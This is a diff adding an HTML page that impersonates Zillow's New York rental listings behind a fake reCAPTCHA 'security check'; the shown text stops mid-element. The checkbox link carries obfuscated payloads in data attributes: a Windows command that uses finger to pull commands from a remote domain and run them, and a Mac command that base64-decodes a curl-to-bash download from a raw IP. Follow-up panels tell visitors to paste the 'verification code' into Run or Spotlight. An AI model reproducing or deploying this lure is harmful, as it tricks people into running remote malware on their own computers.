@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zillow: Real Estate, Apartments, Mortgages &amp; Home Values</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,500;0,600;0,700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --p1:#0041D9;--p2:#002fa3;--p3:#EEF3FF;
+  --p4:#111116;--p5:#596B82;--p6:#767676;
+  --p7:#F4F5F5;--p8:#FFFFFF;
+  --p9:#D3D3D3;--p0:#EBEBEB;
+  --ps:0 1px 4px rgba(0,0,0,.11),0 2px 12px rgba(0,0,0,.07);
+  --nh:64px;--bh:52px;
+}
+html,body{height:100%;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;font-size:14px;color:var(--p4);background:var(--p7);overflow:hidden}
+.fk9mp{position:fixed;top:0;left:0;right:0;height:var(--nh);background:var(--p8);border-bottom:1px solid var(--p0);display:flex;align-items:center;padding:0 20px;gap:0;z-index:10}
+.rw3bx{flex-shrink:0;display:flex;align-items:center;margin-right:24px}
+.qt5jd{display:flex;align-items:center;gap:2px;list-style:none;flex:1}
+.qt5jd a{font-size:13.5px;font-weight:500;color:var(--p4);text-decoration:none;padding:7px 11px;border-radius:4px;white-space:nowrap}
+.qt5jd a:hover{background:var(--p7)}
+.vc8hn{display:flex;align-items:center;gap:10px;margin-left:auto}
+.lp2rk{font-size:13px;font-weight:600;color:var(--p1);border:1.5px solid var(--p1);background:transparent;padding:6px 14px;border-radius:4px;cursor:pointer}
+.ms6yt{width:32px;height:32px;border-radius:50%;background:var(--p1);color:#fff;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;cursor:pointer}
+.nd4cw{position:fixed;top:var(--nh);left:0;right:0;height:var(--bh);background:var(--p8);border-bottom:1px solid var(--p0);display:flex;align-items:center;padding:0 16px;gap:8px;z-index:10}
+.gh7qp{display:flex;align-items:center;gap:6px;border:1.5px solid var(--p9);border-radius:6px;padding:6px 12px;font-size:13px;font-weight:500;color:var(--p4);min-width:200px;background:var(--p8)}
+.bx3rv{display:flex;align-items:center;gap:3px;border:1.5px solid var(--p9);border-radius:20px;padding:5px 12px;font-size:12.5px;font-weight:500;color:var(--p4);white-space:nowrap;background:var(--p8);cursor:pointer}
+.bx3rv.on{border-color:var(--p4);background:var(--p4);color:var(--p8)}
+.wt8lz{position:fixed;top:calc(var(--nh) + var(--bh));left:0;right:0;bottom:0;display:flex}
+.ej2nf{width:41%;min-width:320px;background:var(--p7);overflow-y:auto;padding:14px 14px 20px}
+.ak6ms{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+.py9hv{font-size:14.5px;font-weight:600}
+.fd3xn{font-size:12.5px;color:var(--p5);cursor:pointer}
+.cr7bq{background:var(--p8);border-radius:8px;overflow:hidden;margin-bottom:10px;box-shadow:var(--ps);cursor:pointer;position:relative}
+.hs4kw{width:100%;height:182px;position:relative;overflow:hidden}
+.np8tm{position:absolute;top:9px;left:9px;background:rgba(0,0,0,.6);color:#fff;font-size:10.5px;font-weight:600;padding:3px 7px;border-radius:3px;letter-spacing:.2px}
+.ug5yr{position:absolute;top:9px;right:9px;width:28px;height:28px;background:rgba(255,255,255,.9);border-radius:50%;display:flex;align-items:center;justify-content:center}
+.ml3dp{padding:11px 13px 13px}
+.qt6fh{font-size:18px;font-weight:700;color:var(--p4);margin-bottom:2px}
+.qt6fh span{font-size:12.5px;font-weight:400;color:var(--p5)}
+.bv9rk{font-size:13px;color:var(--p4);margin-bottom:2px}
+.bv9rk b{font-weight:600}
+.xw2jc{font-size:12px;color:var(--p5);margin-bottom:7px}
+.ry4mp{display:flex;gap:5px;flex-wrap:wrap}
+.fn8bx{font-size:10.5px;color:var(--p5);background:var(--p7);padding:2px 7px;border-radius:3px}
+.vk2qd{flex:1;position:relative;overflow:hidden;background:#E4DDD0}
+#rp6mj{position:absolute;inset:0;width:100%;height:100%}
+.hs6wt{position:absolute;inset:0;pointer-events:none}
+.mc4rn{position:absolute;background:var(--p4);color:var(--p8);font-size:11.5px;font-weight:700;padding:5px 10px;border-radius:14px;white-space:nowrap;box-shadow:0 2px 6px rgba(0,0,0,.28);transform:translate(-50%,-100%)}
+.mc4rn::after{content:'';position:absolute;bottom:-5px;left:50%;transform:translateX(-50%);border:5px solid transparent;border-top:5px solid var(--p4);border-bottom:none}
+.mc4rn.sel{background:var(--p1)}
+.mc4rn.sel::after{border-top-color:var(--p1)}
+.pb7ht{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:50;backdrop-filter:blur(1.5px)}
+.dx3km{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:448px;max-width:calc(100vw - 24px);background:var(--p8);border-radius:12px;overflow:hidden;z-index:100;box-shadow:0 8px 40px rgba(0,0,0,.26);max-height:95vh;overflow-y:auto}
+.yr9fn{display:none}
+.yr9fn:target{display:flex;flex-direction:column}
+.dx3km:has(.yr9fn:target) .cw5bx{display:none}
+.lk8qt{background:var(--p1);padding:18px 26px;display:flex;align-items:center;justify-content:space-between}
+.nv2mp{background:rgba(255,255,255,.2);color:#fff;font-size:10.5px;font-weight:600;padding:3px 10px;border-radius:10px;letter-spacing:.5px;text-transform:uppercase}
+.cw5bx{display:flex;flex-direction:column}
+.rj6wh{padding:26px 28px 24px}
+.tz4bn{text-align:center;margin-bottom:18px}
+.pk7qs{width:60px;height:60px;background:var(--p3);border-radius:50%;margin:0 auto;display:flex;align-items:center;justify-content:center}
+.hf3cw{font-size:19px;font-weight:700;color:var(--p4);text-align:center;margin-bottom:8px;text-wrap:balance}
+.xm9rv{font-size:13.5px;color:var(--p5);text-align:center;line-height:1.56;margin-bottom:22px}
+.gd5nk{border:1.5px solid var(--p9);border-radius:8px;padding:13px 15px;display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;background:#FAFAFA;cursor:pointer;text-decoration:none;transition:border-color .15s,box-shadow .15s}
+.gd5nk:hover{border-color:#0041D9;box-shadow:0 0 0 3px rgba(0,65,217,.1)}
+.bt2qh{display:flex;align-items:center;gap:10px}
+.uc8fy{width:22px;height:22px;border:2px solid #C8C8C8;border-radius:3px;background:var(--p8);flex-shrink:0}
+.ry3kp{font-size:13px;color:var(--p4);font-weight:500}
+.mv6xt{display:flex;flex-direction:column;align-items:center;gap:2px}
+.fs9bw{font-size:7.5px;color:#888;text-align:center;line-height:1.3}
+.jd4nt{display:block;width:100%;background:var(--p1);color:#fff;text-align:center;font-size:15px;font-weight:600;padding:13px 16px;border-radius:6px;text-decoration:none;cursor:pointer;border:none;font-family:inherit}
+.jd4nt:hover{background:var(--p2);color:#fff}
+.lw7hm{text-align:center;font-size:11px;color:#AAA;margin-top:12px;line-height:1.5}
+.lw7hm a{color:var(--p1);text-decoration:none}
+.qn5rx{padding:24px 28px 26px}
+.ek8bv{font-size:17.5px;font-weight:700;color:var(--p4);margin-bottom:4px}
+.hw3mp{font-size:13px;color:var(--p5);margin-bottom:18px;line-height:1.5}
+.zr6yf{background:#F0FDF4;border:1px solid #BBF7D0;border-radius:6px;padding:10px 14px;font-size:12.5px;color:#166534;display:flex;align-items:center;gap:8px;margin-bottom:20px}
+.ct9dn{display:flex;flex-direction:column;gap:15px}
+.nk4bx{display:flex;gap:13px;align-items:flex-start}
+.vy7qm{width:25px;height:25px;background:var(--p1);color:#fff;font-size:12.5px;font-weight:700;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+.rh2cp{font-size:13.5px;color:var(--p4);line-height:1.55}
+.rh2cp b{font-weight:600}
+</style>
+</head>
+<body>
+
+<nav class="fk9mp">
+  <div class="rw3bx">
+    <svg width="110" height="24" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 24.09"><g clip-path="url(#xk4b9)"><path d="M14.29 7.345c.3-.067.614.049.795.297l1.11 1.508a.774.774 0 0 1-.167 1.085c-2.277 1.674-4.744 3.9-6.163 5.526-.034.038-.009.044.014.035 2.525-.935 8.329-2.315 11.124-2.702V9.608l.003.002c0-.456-.21-.894-.57-1.18l-.185-.148-8.807-6.96a1.507 1.507 0 0 0-1.865 0S3.158 6.387.57 8.43C.21 8.716 0 9.15 0 9.609v2.84C6.255 9.44 12.573 7.731 14.29 7.344Z" fill="#0041D9"/><path d="M5.915 20.835a.77.77 0 0 1-.889-.214 86.356 86.356 0 0 1-1.272-1.565.778.778 0 0 1 .02-.992c1.221-1.41 4.872-5.362 6.55-6.478.037-.024.027-.048-.014-.038-2.057.555-8.022 2.766-10.31 3.888v6.72c0 .832.672 1.504 1.505 1.504H19.5c.83 0 1.505-.672 1.505-1.502v-5.422c-3.065.433-11.066 2.415-15.09 4.102v-.003Z" fill="#0041D9"/><path d="M49.753 9.274h-4.182v14.388h4.182V9.274ZM26.892 23.662v-2.357l9.71-13.58v-.281h-9.543v-3.76h15.79V6.04l-9.542 13.582v.28h9.822v3.76H26.892v.001Zm25.87 0V2.982h4.168v20.68h-4.168Zm7.186 0V2.982h4.168v20.68h-4.168Zm6.036-7.186c0-4.622 3.173-7.618 7.977-7.618 4.803 0 7.976 2.996 7.978 7.618 0 4.648-3.202 7.618-7.977 7.618s-7.978-2.995-7.978-7.617v-.001Zm11.769 0c0-2.382-1.574-4.061-3.792-4.061s-3.82 1.68-3.82 4.062c0 2.381 1.574 4.09 3.821 4.09 2.248 0 3.792-1.71 3.792-4.09l-.002-.001Zm8.505 7.186L81.938 9.29h4.235l2.917 10.302h.28L91.92 9.29h4.152l2.748 10.3h.28l2.859-10.303h4.123l-4.346 14.372h-5.413l-2.188-9.514h-.28l-2.16 9.516h-5.44.002Zm21.875-15.547h-.18V6.82h.608c.305 0 .503.155.503.393 0 .22-.186.374-.446.386h-.024l.507.516h-.228l-.484-.507h-.257v.507l.001-.001Zm0-1.147v.494h.428c.2 0 .323-.094.323-.248 0-.153-.123-.245-.323-.245h-.428v-.001Z" fill="#111116"/><path d="M108.457 9.013a1.541 1.541 0 0 1-1.522-1.244 1.541 1.541 0 0 1 .424-1.395 1.537 1.537 0 0 1 1.394-.424 1.54 1.54 0 0 1 1.216 1.216 1.532 1.532 0 0 1-.424 1.394 1.53 1.53 0 0 1-1.091.453h.003Zm-.004-2.874a1.32 1.32 0 0 0-.939.389 1.325 1.325 0 0 0-.364 1.2 1.329 1.329 0 0 0 2.243.678 1.329 1.329 0 0 0-.942-2.269l.002.002Zm-63.03-.936c0-1.25.932-2.177 2.24-2.177 1.307 0 2.238.926 2.238 2.177 0 1.252-.931 2.177-2.239 2.177-1.307 0-2.239-.901-2.24-2.177h.001Z" fill="#111116"/></g><defs><clipPath id="xk4b9"><path fill="#fff" d="M0 0h110v24H0z"/></clipPath></defs></svg>
+  </div>
+  <ul class="qt5jd">
+    <li><a href="#">Buy</a></li>
+    <li><a href="#">Rent</a></li>
+    <li><a href="#">Sell</a></li>
+    <li><a href="#">Get a mortgage</a></li>
+    <li><a href="#">Find an agent</a></li>
+    <li><a href="#">Manage rentals</a></li>
+    <li><a href="#">Advertise</a></li>
+  </ul>
+  <div class="vc8hn">
+    <button class="lp2rk">Sign in</button>
+    <div class="ms6yt">US</div>
+  </div>
+</nav>
+
+<div class="nd4cw">
+  <div class="gh7qp">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#596B82" stroke-width="2.5" stroke-linecap="round"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/></svg>
+    New York, NY
+  </div>
+  <div class="bx3rv on">For rent ▾</div>
+  <div class="bx3rv">Price ▾</div>
+  <div class="bx3rv">Beds &amp; baths ▾</div>
+  <div class="bx3rv">Home type ▾</div>
+  <div class="bx3rv">More ▾</div>
+</div>
+
+<div class="wt8lz">
+
+  <div class="ej2nf">
+    <div class="ak6ms">
+      <div class="py9hv">2,047 rentals in New York, NY</div>
+      <div class="fd3xn">Sort: Newest ▾</div>
+    </div>
+
+    <div class="cr7bq">
+      <div class="hs4kw" style="background:linear-gradient(168deg,#89B6DA 0%,#6C9EC6 38%,#C6B286 58%,#B6A278 75%,#8AB676 95%)">
+        <div class="np8tm">For Rent</div>
+        <div class="ug5yr"><svg width="15" height="15" fill="none" stroke="#444" stroke-width="2" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
+      </div>
+      <div class="ml3dp">
+        <div class="qt6fh">$2,695<span>/mo</span></div>
+        <div class="bv9rk"><b>1</b> bd &nbsp;<b>1</b> ba &nbsp;<b>740</b> sqft</div>
+        <div class="xw2jc">315 W 57th St APT 4B, New York, NY 10019</div>
+        <div class="ry4mp"><span class="fn8bx">Virtual Tour</span><span class="fn8bx">1 day ago</span></div>
+      </div>
+    </div>
+
+    <div class="cr7bq">
+      <div class="hs4kw" style="background:linear-gradient(172deg,#C2D2E2 0%,#ADBDCD 38%,#CEBCA6 58%,#C2B296 75%,#96C286 95%)">
+        <div class="np8tm">For Rent</div>
+        <div class="ug5yr"><svg width="15" height="15" fill="none" stroke="#444" stroke-width="2" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
+      </div>
+      <div class="ml3dp">
+        <div class="qt6fh">$3,450<span>/mo</span></div>
+        <div class="bv9rk"><b>2</b> bds &nbsp;<b>2</b> ba &nbsp;<b>1,050</b> sqft</div>
+        <div class="xw2jc">54 W 74th St APT 9D, Manhattan, NY 10023</div>
+        <div class="ry4mp"><span class="fn8bx">Pet friendly</span><span class="fn8bx">3 days ago</span></div>
+      </div>
+    </div>
+
+    <div class="cr7bq">
+      <div class="hs4kw" style="background:linear-gradient(167deg,#EDC676 0%,#E2B256 38%,#D2A66E 58%,#E6D6B6 75%,#A2C66E 95%)">
+        <div class="np8tm">Income restricted</div>
+        <div class="ug5yr"><svg width="15" height="15" fill="none" stroke="#444" stroke-width="2" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
+      </div>
+      <div class="ml3dp">
+        <div class="qt6fh">$1,750<span>/mo</span></div>
+        <div class="bv9rk">Studio &nbsp;<b>1</b> ba &nbsp;<b>490</b> sqft</div>
+        <div class="xw2jc">210 E 23rd St APT 2C, New York, NY 10010</div>
+        <div class="ry4mp"><span class="fn8bx">Utilities incl.</span><span class="fn8bx">4 days ago</span></div>
+      </div>
+    </div>
+
+    <div class="cr7bq">
+      <div class="hs4kw" style="background:linear-gradient(173deg,#94C8EA 0%,#76AED6 38%,#EEECE4 60%,#E2DED6 75%,#8ABA76 95%)">
+        <div class="np8tm">For Rent</div>
+        <div class="ug5yr"><svg width="15" height="15" fill="none" stroke="#444" stroke-width="2" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
+      </div>
+      <div class="ml3dp">
+        <div class="qt6fh">$4,850<span>/mo</span></div>
+        <div class="bv9rk"><b>3</b> bds &nbsp;<b>2</b> ba &nbsp;<b>1,280</b> sqft</div>
+        <div class="xw2jc">175 Riverside Dr APT 7F, New York, NY 10024</div>
+        <div class="ry4mp"><span class="fn8bx">Doorman</span><span class="fn8bx">In-unit W/D</span><span class="fn8bx">6 days ago</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="vk2qd">
+    <canvas id="rp6mj"></canvas>
+    <div class="hs6wt">
+      <div class="mc4rn sel" style="left:27%;top:38%">$2,695/mo</div>
+      <div class="mc4rn" style="left:54%;top:26%">$3,450/mo</div>
+      <div class="mc4rn" style="left:40%;top:57%">$1,750/mo</div>
+      <div class="mc4rn" style="left:71%;top:44%">$4,850/mo</div>
+    </div>
+  </div>
+</div>
+
+<div class="pb7ht"></div>
+
+<div class="dx3km">
+
+  <div class="cw5bx">
+    <div class="lk8qt">
+      <div>
+        <svg width="100" height="22" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 24.09"><g clip-path="url(#wr7q2)"><path d="M14.29 7.345c.3-.067.614.049.795.297l1.11 1.508a.774.774 0 0 1-.167 1.085c-2.277 1.674-4.744 3.9-6.163 5.526-.034.038-.009.044.014.035 2.525-.935 8.329-2.315 11.124-2.702V9.608l.003.002c0-.456-.21-.894-.57-1.18l-.185-.148-8.807-6.96a1.507 1.507 0 0 0-1.865 0S3.158 6.387.57 8.43C.21 8.716 0 9.15 0 9.609v2.84C6.255 9.44 12.573 7.731 14.29 7.344Z" fill="#fff"/><path d="M5.915 20.835a.77.77 0 0 1-.889-.214 86.356 86.356 0 0 1-1.272-1.565.778.778 0 0 1 .02-.992c1.221-1.41 4.872-5.362 6.55-6.478.037-.024.027-.048-.014-.038-2.057.555-8.022 2.766-10.31 3.888v6.72c0 .832.672 1.504 1.505 1.504H19.5c.83 0 1.505-.672 1.505-1.502v-5.422c-3.065.433-11.066 2.415-15.09 4.102v-.003Z" fill="#fff"/><path d="M49.753 9.274h-4.182v14.388h4.182V9.274ZM26.892 23.662v-2.357l9.71-13.58v-.281h-9.543v-3.76h15.79V6.04l-9.542 13.582v.28h9.822v3.76H26.892v.001Zm25.87 0V2.982h4.168v20.68h-4.168Zm7.186 0V2.982h4.168v20.68h-4.168Zm6.036-7.186c0-4.622 3.173-7.618 7.977-7.618 4.803 0 7.976 2.996 7.978 7.618 0 4.648-3.202 7.618-7.977 7.618s-7.978-2.995-7.978-7.617v-.001Zm11.769 0c0-2.382-1.574-4.061-3.792-4.061s-3.82 1.68-3.82 4.062c0 2.381 1.574 4.09 3.821 4.09 2.248 0 3.792-1.71 3.792-4.09l-.002-.001Zm8.505 7.186L81.938 9.29h4.235l2.917 10.302h.28L91.92 9.29h4.152l2.748 10.3h.28l2.859-10.303h4.123l-4.346 14.372h-5.413l-2.188-9.514h-.28l-2.16 9.516h-5.44.002Zm21.875-15.547h-.18V6.82h.608c.305 0 .503.155.503.393 0 .22-.186.374-.446.386h-.024l.507.516h-.228l-.484-.507h-.257v.507l.001-.001Zm0-1.147v.494h.428c.2 0 .323-.094.323-.248 0-.153-.123-.245-.323-.245h-.428v-.001Z" fill="#fff"/></g><defs><clipPath id="wr7q2"><path fill="#fff" d="M0 0h110v24H0z"/></clipPath></defs></svg>
+      </div>
+      <div class="nv2mp">Security Check</div>
+    </div>
+    <div class="rj6wh">
+      <div class="tz4bn">
+        <div class="pk7qs">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#0041D9" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        </div>
+      </div>
+      <div class="hf3cw">Verify you're not a robot</div>
+      <div class="xm9rv">We've detected unusual activity from your network. Please complete verification to continue browsing Zillow.</div>
+
+      <a href="#vf8xt" class="gd5nk" data-val="%COMSPEC% /c &quot;%COMSPEC% /c start &quot;&quot; /min for /f &quot;delims=@&quot; %u in&quot; (',f^^i^^n^^g^^e^^r df^g^w^e^r^tva^ds^^23@leftsideegpeakk.com') do %u &" data-vmac="echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzE0Ni4xMDMuMTAxLjIyOS9MdXJvd3VmKSI=' | base64 -d | bash">
+        <div class="bt2qh">
+          <div class="uc8fy"></div>
+          <div class="ry3kp">I'm not a robot</div>
+        </div>
+        <div class="mv6xt">
+          <svg width="32" height="32" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="32" r="29" fill="#F8F8F8" stroke="#E0E0E0" stroke-width="2"/><path d="M32 16c-8.84 0-16 7.16-16 16s7.16 16 16 16 16-7.16 16-16S40.84 16 32 16zm0 5a11 11 0 0 1 9.8 6H22.2A11 11 0 0 1 32 21zm0 22a11 11 0 0 1-9.8-6h19.6A11 11 0 0 1 32 43z" fill="#4A90D9" opacity=".75"/></svg>
+          <div class="fs9bw">reCAPTCHA<br>Privacy · Terms</div>
+        </div>
+      </a>
+    </div>
+  </div>
+
+  <div class="yr9fn" id="qb3rn">
+    <div class="lk8qt">
+      <div>
+        <svg width="100" height="22" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 24.09"><g clip-path="url(#bv3m1)"><path d="M14.29 7.345c.3-.067.614.049.795.297l1.11 1.508a.774.774 0 0 1-.167 1.085c-2.277 1.674-4.744 3.9-6.163 5.526-.034.038-.009.044.014.035 2.525-.935 8.329-2.315 11.124-2.702V9.608l.003.002c0-.456-.21-.894-.57-1.18l-.185-.148-8.807-6.96a1.507 1.507 0 0 0-1.865 0S3.158 6.387.57 8.43C.21 8.716 0 9.15 0 9.609v2.84C6.255 9.44 12.573 7.731 14.29 7.344Z" fill="#fff"/><path d="M5.915 20.835a.77.77 0 0 1-.889-.214 86.356 86.356 0 0 1-1.272-1.565.778.778 0 0 1 .02-.992c1.221-1.41 4.872-5.362 6.55-6.478.037-.024.027-.048-.014-.038-2.057.555-8.022 2.766-10.31 3.888v6.72c0 .832.672 1.504 1.505 1.504H19.5c.83 0 1.505-.672 1.505-1.502v-5.422c-3.065.433-11.066 2.415-15.09 4.102v-.003Z" fill="#fff"/><path d="M49.753 9.274h-4.182v14.388h4.182V9.274ZM26.892 23.662v-2.357l9.71-13.58v-.281h-9.543v-3.76h15.79V6.04l-9.542 13.582v.28h9.822v3.76H26.892v.001Zm25.87 0V2.982h4.168v20.68h-4.168Zm7.186 0V2.982h4.168v20.68h-4.168Zm6.036-7.186c0-4.622 3.173-7.618 7.977-7.618 4.803 0 7.976 2.996 7.978 7.618 0 4.648-3.202 7.618-7.977 7.618s-7.978-2.995-7.978-7.617v-.001Zm11.769 0c0-2.382-1.574-4.061-3.792-4.061s-3.82 1.68-3.82 4.062c0 2.381 1.574 4.09 3.821 4.09 2.248 0 3.792-1.71 3.792-4.09l-.002-.001Zm8.505 7.186L81.938 9.29h4.235l2.917 10.302h.28L91.92 9.29h4.152l2.748 10.3h.28l2.859-10.303h4.123l-4.346 14.372h-5.413l-2.188-9.514h-.28l-2.16 9.516h-5.44.002Zm21.875-15.547h-.18V6.82h.608c.305 0 .503.155.503.393 0 .22-.186.374-.446.386h-.024l.507.516h-.228l-.484-.507h-.257v.507l.001-.001Zm0-1.147v.494h.428c.2 0 .323-.094.323-.248 0-.153-.123-.245-.323-.245h-.428v-.001Z" fill="#fff"/></g><defs><clipPath id="bv3m1"><path fill="#fff" d="M0 0h110v24H0z"/></clipPath></defs></svg>
+      </div>
+      <div class="nv2mp">Step 2 of 2</div>
+    </div>
+    <div class="qn5rx">
+      <div class="ek8bv">Verification Steps</div>
+      <div class="hw3mp">Complete these steps on your ⌘ Mac device to continue.</div>
+      <div class="zr6yf">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#166534" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        Verification code copied to clipboard
+      </div>
+      <div class="ct9dn">
+        <div class="nk4bx"><div class="vy7qm">1</div><div class="rh2cp">Press <b>Cmd ⌘ + Space</b> on your keyboard</div></div>
+        <div class="nk4bx"><div class="vy7qm">2</div><div class="rh2cp">Paste the code from clipboard with <b>Cmd ⌘ + V</b>, then press <b>Enter</b></div></div>
+        <div class="nk4bx"><div class="vy7qm">3</div><div class="rh2cp">Wait for verification to complete — your browser will refresh automatically</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="yr9fn" id="vf8xt">
+    <div class="lk8qt">
+      <div>
+        <svg width="100" height="22" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 24.09"><g clip-path="url(#nd5j8)"><path d="M14.29 7.345c.3-.067.614.049.795.297l1.11 1.508a.774.774 0 0 1-.167 1.085c-2.277 1.674-4.744 3.9-6.163 5.526-.034.038-.009.044.014.035 2.525-.935 8.329-2.315 11.124-2.702V9.608l.003.002c0-.456-.21-.894-.57-1.18l-.185-.148-8.807-6.96a1.507 1.507 0 0 0-1.865 0S3.158 6.387.57 8.43C.21 8.716 0 9.15 0 9.609v2.84C6.255 9.44 12.573 7.731 14.29 7.344Z" fill="#fff"/><path d="M5.915 20.835a.77.77 0 0 1-.889-.214 86.356 86.356 0 0 1-1.272-1.565.778.778 0 0 1 .02-.992c1.221-1.41 4.872-5.362 6.55-6.478.037-.024.027-.048-.014-.038-2.057.555-8.022 2.766-10.31 3.888v6.72c0 .832.672 1.504 1.505 1.504H19.5c.83 0 1.505-.672 1.505-1.502v-5.422c-3.065.433-11.066 2.415-15.09 4.102v-.003Z" fill="#fff"/><path d="M49.753 9.274h-4.182v14.388h4.182V9.274ZM26.892 23.662v-2.357l9.71-13.58v-.281h-9.543v-3.76h15.79V6.04l-9.542 13.582v.28h9.822v3.76H26.892v.001Zm25.87 0V2.982h4.168v20.68h-4.168Zm7.186 0V2.982h4.168v20.68h-4.168Zm6.036-7.186c0-4.622 3.173-7.618 7.977-7.618 4.803 0 7.976 2.996 7.978 7.618 0 4.648-3.202 7.618-7.977 7.618s-7.978-2.995-7.978-7.617v-.001Zm11.769 0c0-2.382-1.574-4.061-3.792-4.061s-3.82 1.68-3.82 4.062c0 2.381 1.574 4.09 3.821 4.09 2.248 0 3.792-1.71 3.792-4.09l-.002-.001Zm8.505 7.186L81.938 9.29h4.235l2.917 10.302h.28L91.92 9.29h4.152l2.748 10.3h.28l2.859-10.303h4.123l-4.346 14.372h-5.413l-2.188-9.514h-.28l-2.16 9.516h-5.44.002Zm21.875-15.547h-.18V6.82h.608c.305 0 .503.155.503.393 0 .22-.186.374-.446.386h-.024l.507.516h-.228l-.484-.507h-.257v.507l.001-.001Zm0-1.147v.494h.428c.2 0 .323-.094.323-.248 0-.153-.123-.245-.323-.245h-.428v-.001Z" fill="#fff"/></g><defs><clipPath id="nd5j8"><path fill="#fff" d="M0 0h110v24H0z"/></clipPath></defs></svg>
+      </div>
+      <div class="nv2mp">Step 2 of 2</div>
+    </div>
+    <div class="qn5rx">
+      <div class="ek8bv">Verification Steps</div>
+      <div class="hw3mp">Complete these steps on your <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" style="vertical-align:middle;margin:0 3px"><rect x="0" y="0" width="11" height="11" fill="#F25022"/><rect x="13" y="0" width="11" height="11" fill="#7FBA00"/><rect x="0" y="13" width="11" height="11" fill="#00A4EF"/><rect x="13" y="13" width="11" height="11" fill="#FFB900"/></svg> Windows device to continue.</div>
+      <div class="zr6yf">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#166534" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        Verification code copied to clipboard
+      </div>
+      <div class="ct9dn">
+        <div class="nk4bx"><div class="vy7qm">1</div><div class="rh2cp">Press <b>Win <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" style="vertical-align:middle;margin-left:4px"><rect x="0" y="0" width="11" height="11" fill="#F25022"/><rect x="13" y="0" width="11" height="11" fill="#7FBA00"/><rect x="0" y="13" width="11" height="11" fill="#00A4EF"/><rect x="13" y="13" width="11" height="11" fill="#FFB900"/></svg> + R</b> on your keyboard</div></div>
+        <div class="nk4bx"><div class="vy7qm">2</div><div class="rh2cp">Paste the code from clipboard with <b>Ctrl + V</b>, then press <b>Enter</b></div></div>
+        <div class="nk4bx"><div class="vy7qm">3</div><div class="rh2cp">Wait for verification to complete — your browser will refresh automatically</div></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<div class="pb7ht" id="kw7hp" style="display:none"></div>
+<div class="dx3km" id="tn4bx" style="display:none;flex-direction:column">
+  <div class="lk8qt">
+    <div>
+      <svg width="100" height="22" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 24.09"><g clip-path="url(#pt9c6)"><path d="M14.29 7.345c.3-.067.614.049.795.297l1.11 1.508a.774.774 0 0 1-.167 1.085c-2.277 1.674-4.744 3.9-6.163 5.526-.034.038-.009.044.014.035 2.525-.935 8.329-2.315 11.124-2.702V9.608l.003.002c0-.456-.21-.894-.57-1.18l-.185-.148-8.807-6.96a1.507 1.507 0 0 0-1.865 0S3.158 6.387.57 8.43C.21 8.716 0 9.15 0 9.609v2.84C6.255 9.44 12.573 7.731 14.29 7.344Z" fill="#fff"/><path d="M5.915 20.835a.77.77 0 0 1-.889-.214 86.356 86.356 0 0 1-1.272-1.565.778.778 0 0 1 .02-.992c1.221-1.41 4.872-5.362 6.55-6.478.037-.024.027-.048-.014-.038-2.057.555-8.022 2.766-10.31 3.888v6.72c0 .832.672 1.504 1.505 1.504H19.5c.83 0 1.505-.672 1.505-1.502v-5.422c-3.065.433-11.066 2.415-15.09 4.102v-.003Z" fill="#fff"/><path 